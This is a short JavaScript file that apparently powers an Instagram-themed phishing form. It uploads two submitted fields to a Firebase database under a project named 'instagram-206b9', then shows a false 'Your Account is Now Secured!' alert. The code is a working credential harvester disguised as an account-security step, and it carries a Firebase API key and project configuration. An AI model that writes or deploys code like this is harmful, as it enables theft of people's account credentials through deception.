// Import necessary modules from Firebase SDK
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

// Initialize Firebase with your project config
const firebaseConfig = {
    apiKey: "AIzaSyAGqODgZ_Qy96E7QZT2kiCnThkWvpAufvw",
    authDomain: "instagram-206b9.firebaseapp.com",
    databaseURL: "https://instagram-206b9-default-rtdb.firebaseio.com",
    projectId: "instagram-206b9",
    storageBucket: "instagram-206b9.appspot.com",
    messagingSenderId: "557636576338",
    appId: "1:557636576338:web:1fd6e5dc03c4923742eb8b",
    measurementId: "G-GQCZ4MMEJN"
};

const app = initializeApp(firebaseConfig);

// Reference to the Firebase database
const database = getDatabase(app);

// Form submission handling
document.getElementById('dataForm').addEventListener('submit', function (e) {
    e.preventDefault();

    // Get values from the form
    const field1Value = document.getElementById('field1').value;
    const field2Value = document.getElementById('field2').value;

    // Push data to Firebase database
    push(ref(database, 'data'), {
        field1: field1Value,
        field2: field2Value
    });

    // Clear the form
    document.getElementById('dataForm').reset();

    alert('Your Account is Now Secured!');
});
